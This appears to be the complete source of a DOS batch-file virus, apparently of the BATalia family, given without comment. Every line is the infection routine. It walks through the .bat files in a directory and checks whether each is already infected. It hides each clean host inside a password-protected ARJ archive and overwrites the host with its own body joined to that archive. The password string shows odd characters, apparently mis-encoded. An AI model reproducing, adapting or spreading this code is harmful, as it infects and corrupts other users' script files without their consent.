if "%1"=="2" goto s
for %%b in (*.bat) do call %0 2 %%b
goto b
:s
if %2==I.BAT goto b
copy %2 s>l
echo NNN>>s
echo 1>z1
echo 2>z2
echo 3>z3
del z?/p<s>l
if exist z? goto i
del ??
goto b
:i
ren %2 p >l
arj a j p i.bat BATalia3 -g®®b¥pá >nul
copy /b BATalia3+j.arj %2>l
del j.arj
del ??
:b
